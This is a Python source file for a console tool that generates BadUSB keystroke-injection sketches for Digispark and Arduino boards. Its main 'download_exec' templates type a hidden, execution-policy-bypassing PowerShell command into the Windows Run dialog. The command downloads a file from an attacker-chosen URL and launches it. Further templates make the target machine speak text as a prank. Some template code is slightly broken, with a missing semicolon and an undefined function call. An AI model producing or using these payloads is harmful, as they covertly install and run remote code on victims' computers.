import os
import sys
import subprocess
from colorama import Fore
from time import sleep
GREEN=Fore.LIGHTGREEN_EX
RESET=Fore.RESET
BLUE=Fore.LIGHTBLUE_EX


help_console=f"""

{BLUE}[*]{RESET} Available Commands:
=======================

Core Commands:
==============

    Command	 Description
    -------	 ----------
    exit      	 exit programs
    help      	 show this help
    set       	 set platforms
    show      	 showing settings for an object that's been configured
    use       	 select module for modules

Example:
=======
   
    help => you can use 'help' to see Available Commands.
    but you can use help to see what can the object you select do like:
    ``` di1 > help platform ``` => output: ``` You can set platforms to choose Arduino or Digispark ```
    
    set => you can use 'set' to platforms and in modules you can 
    use it to segt values for given objects like pathes...
    ``` di1 > set platform/arduino ```

    show => you can use 'show' to see options that you set before like:
    ``` di1 > show modules ``` => output: ``` download_exec ... ``` or for things you can set would be like this:
    ``` di1 > show platform ``` => output: ``` arduino ```
    
    use => you can use 'use' to use a module for example:
    ``` di1 > download_exec ```

"""


def Digispark(url, file_path, DEFAULT_DELAY, MAIN_DELAY):
    digispark_script = f"""
#include "DigiKeyboard.h"

void setup() {{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay({DEFAULT_DELAY}); // Wait for a moment.
  // Open Run dialog (Win + R).
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay({DEFAULT_DELAY}); // Wait for the Run dialog to open.
  DigiKeyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass \\"IEX (New-Object System.Net.WebClient).DownloadFile('{url}', \\\\\\"$env:{file_path}\\\\\\"); Start-Process \\\\\\"$env:{file_path}\\\\\\"\\"");
  DigiKeyboard.delay({MAIN_DELAY});
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}}

void loop() {{}}
"""
    return digispark_script

def Digispark_Prank_Talker(text, DEFAULT_DELAY, MAIN_DELAY):
    digispark_script = f"""
#include "DigiKeyboard.h"

void setup() {{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay({DEFAULT_DELAY}); // Wait for a moment.
  // Open Run dialog (Win + R).
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay({DEFAULT_DELAY}); // Wait for the Run dialog to open.
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay({MAIN_DELAY}); // Wait for the Run dialog to open.
  DigiKeyboard.println("Add-Type -AssemblyName System.speech");
  DigiKeyboard.delay({MAIN_DELAY}); // Wait for the Run dialog to open.
  DigiKeyboard.println("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
  DigiKeyboard.delay({MAIN_DELAY}); // Wait for the Run dialog to open.
  DigiKeyboard.println("$speak.Speak(\\\"{text}\\\")");
  DigiKeyboard.delay({MAIN_DELAY}); // Wait for the Run dialog to open.
  DigiKeyboard.println("exit");

  DigiKeyboard.delay({MAIN_DELAY});
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}}

void loop() {{}}
"""
    return digispark_script


def Arduino(url, file_path, DEFAULT_DELAY, MAIN_DELAY):
    arduino_script = f"""
void setup() {{
  Keyboard.begin();
  // Open the Run dialog with Win + R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay({DEFAULT_DELAY});
  Keyboard.println("powershell -NoP -NonI -W Hidden -Exec Bypass \\"IEX (New-Object System.Net.WebClient).DownloadFile('{url}', \\\\\\"$env:{file_path}\\\\\\"); Start-Process \\\\\\"$env:{file_path}\\\\\\"\\"");  delay({MAIN_DELAY})
  delay({MAIN_DELAY});
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}}

void loop() {{}}
"""
    return arduino_script

def Arduino_Prank_Talker(text, DEFAULT_DELAY, MAIN_DELAY):
    arduino_script = f"""
void setup() {{
  Keyboard.begin();
  delay(5000);
  CommandAtRunBarMSWIN("powershell");
  delay(4000);
  Keyboard.println("Add-Type -AssemblyName System.speech");
  delay(2000);
  Keyboard.println("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
  delay(2000);
  Keyboard.println("$speak.Speak(\\\"{text}\\\")");
  delay(2000);
  Keyboard.println("exit");
}}

void loop() {{}}
"""
    return arduino_script

def check(prompt):
  print(Fore.LIGHTBLUE_EX+"[*] "+RESET+prompt)
  #  slashes=["|","/","-","\x5c","\x5c"]
  #  out = 0
  #  s = 0
  #  while True:
  #        if s == 4:
  #           s = 0




  #        out+=1
  #        s+=1
  #        if out == 24:
  #          sys.stdout.write(f'\r{GREEN}[$] {RESET}{prompt} ' + slashes[2]) 
  #          break

  #        else:

  #           sys.stdout.write(f'\r{GREEN}[$] {RESET}{prompt} ' + slashes[s])

  #        sys.stdout.flush()
  #        sleep(0.125)
  #  sleep(0.15)
  #  print()

def is_command_valid(command):
    try:
        subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return True
    except subprocess.CalledProcessError:
        return False

def runCMD(command):
  
   os.system(command)

def help(x):
   if x == "console":
      print(help_console)
def clear():
   os.system("clear")
